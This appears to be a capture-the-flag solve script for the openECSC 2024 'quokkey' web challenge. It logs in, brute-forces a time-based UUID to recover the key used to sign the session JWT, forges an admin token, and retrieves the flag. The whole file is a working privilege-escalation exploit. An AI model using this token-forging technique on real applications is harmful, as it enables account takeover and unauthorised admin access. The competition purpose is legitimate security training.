#!/usr/bin/env python3

import logging
import requests
import jwt
import os
import re
from uuid import UUID

logging.disable()

URL = os.environ.get("URL", "http://quokkey.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

FLAG_RE = re.compile(r"(openECSC\{.+\})")
BASE_URL = f"{URL}/api/v1"
LOGIN_PAYLOAD = {
    "username": "quokka",
    "password": "quokka",
}


s = requests.Session()
r = s.post(f"{BASE_URL}/session", json=LOGIN_PAYLOAD)
r.raise_for_status()

session_jwt = s.cookies.get("session_jwt")
session_id = s.cookies.get("session_id")
jwt_body = jwt.decode(session_jwt, options={"verify_signature": False})
posts = [p for p in s.get(f"{BASE_URL}/posts").json() if p["title"] == "new login"]
pid = posts[0]["id"]

pid1, pid2, pid3 = pid[:4], int(pid[4:8], 16), pid[8:]
while pid2 < 0xffff:
    pid2 += 1
    sid = UUID(f"{pid1}{pid2.to_bytes(2, 'big').hex()}{pid3}", version=1)
    encoded = jwt.encode(jwt_body, sid.bytes, algorithm="HS256")
    if encoded == session_jwt:
        break

jwt_body["user"] = "admin"
session_jwt = jwt.encode(jwt_body, sid.bytes, algorithm="HS256")

s.cookies.clear()
s.cookies.set("session_jwt", session_jwt)
s.cookies.set("session_id", session_id)

flag = s.get(f"{BASE_URL}/superkey").json()["msg"]
print(FLAG_RE.search(flag).group(1))
